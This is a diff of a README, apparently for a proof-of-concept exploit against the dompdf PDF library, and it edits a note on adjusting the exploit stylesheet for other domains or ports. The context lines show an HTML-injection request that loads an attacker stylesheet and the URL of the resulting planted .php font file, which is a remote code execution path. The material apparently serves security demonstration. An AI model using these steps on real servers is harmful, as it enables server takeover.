@@ -30,4 +30,4 @@ http://localhost:9000/index.php?pdf&title=<link rel=stylesheet href='http://loca
 http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php
 ```
 
-**Please note:** In case you're using different domains, please edit `exploit/exploit.css` accordingly and check `application/dompdf/lib/fonts` for the full font filename.
+**Please note:** In case you're using different domains or ports, please edit `exploit/exploit.css` accordingly and check `application/dompdf/lib/fonts` for the full font filename.
